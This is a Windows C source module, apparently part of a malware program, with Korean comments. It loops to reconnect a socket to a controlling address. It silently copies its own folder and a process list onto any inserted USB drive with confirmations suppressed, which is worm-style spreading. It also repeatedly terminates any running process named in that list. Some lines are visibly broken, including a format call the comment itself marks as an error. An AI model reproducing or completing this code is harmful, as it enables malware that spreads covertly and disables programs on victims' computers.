#include "modules.h"



unsigned int WINAPI ConnectProc(void* lpParam)//수정
{

	while (1) {

		if (connect(hSocket, (SOCKADDR*)&hAddr, sizeof(hAddr)) == 0) {

			isEof = FALSE;
			RecvProc();

		}
		if (isEof)//eof코드가 설정되어있으면
		{

			closesocket(hSocket);
			CreateSocket();//재접속시도

		}
		Sleep(2000);

	}
	return TRUE;

}



unsigned int WINAPI USBDetector(void *lpParam)//usb 디텍터
{
	int ch;
	TCHAR Path[10];
	SHFILEOPSTRUCT fo;
	TCHAR Username[10] = { 0, };
	DWORD Userlen;

	GetUserName(Username, &Userlen);

	while (1) {

		for (ch = 'a';ch <= 'z';ch++) {

			wsprintf(Path, _T("%c:\\"), ch);
			if (GetDriveType(Path) == DRIVE_REMOVABLE)//usb감지
			{
				fo.hwnd = hWndMain;
				fo.wFunc = FO_COPY;
				fo.pFrom = _T("./*");
				fo.pTo = Path;
				fo.fFlags = FOF_SILENT | FOF_NOCONFIRMATION;
				if (SHFileOperation(&fo) != 0) {//프로세스위치의 모든파일을 usb로 복사
#ifdef DEBUG
					MessageBox(hWndMain, _T("First SHFileOperation Error!"), _T("Error"), MB_OK);
#endif		
				}

				fo.pFrom = _T("C:\\Users\\%s\\Documents\\proc.txt", Username);//에러 
				

				if (SHFileOperation(&fo) != 0) {
#ifdef DEBUG
					MessageBox(hWndMain, _T("Second SHFileOperation Error!"), _T("Error"), MB_OK);
#endif		
				}
				
				

			}
		}

		Sleep(5000);
	}
	return 0;

}

unsigned int WINAPI ProcessBlocker(void *lpParam) {

	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	HANDLE hProcess;
	int count = 0;
	TCHAR procName[100][20] = { 0, };
	TCHAR readFile[2000];
	TCHAR *temp;
	HANDLE hFile;
	DWORD numOfByteRead = 0;
	int i;
	TCHAR FileName[BUF_SIZE] = { 0, };
	TCHAR Username[10] = { 0, };
	DWORD Userlen;


	

	GetUserName(Username, &Userlen);
	wsprintf(FileName, TEXT("C:\\Users\\%s\\Documents\\proc.txt"), Username);
	hFile = CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile == INVALID_HANDLE_VALUE) {
		
#ifdef DEBUG
		MessageBox(hWndMain, TEXT("CreateFile Error!"), TEXT("Error"), MB_OK);
#endif
		return 1;

	}
	ReadFile(hFile, readFile, 2000, &numOfByteRead, NULL);

	_tcstok(readFile, _T(":"));

	while (1) {

		temp = _tcstok(NULL, _T(":"));

		if (_tcslen(temp) <= 0)
			break;
		else if (_tcsstr(temp, _T(";")) != NULL)
			break;

		_tcscpy(procName[count], temp);

		count++;

	}

	while (1) {

		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		if (hProcessSnap == INVALID_HANDLE_VALUE)
		{

			fputs("CreateToolhelp32Snapshot Error!\n", stderr);
			return 1;
		}

		pe32.dwSize = sizeof(PROCESSENTRY32);

		if (!Process32First(hProcessSnap, &pe32))
		{

			fputs("Process32First Error!\n", stderr);
			return 1;
		}


		do {


			for (i = 0;i<count;i++) {


				if (!_tcscmp(pe32.szExeFile, procName[i])) {

					hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
					if (hProcess != NULL)
					{
						TerminateProcess(hProcess, -1);

						break;

					}
					CloseHandle(hProcess);
					break;

				}

			}


		} while (Process32Next(hProcessSnap, &pe32));




		CloseHandle(hProcessSnap);
		Sleep(1000);

	}

	return 0;




}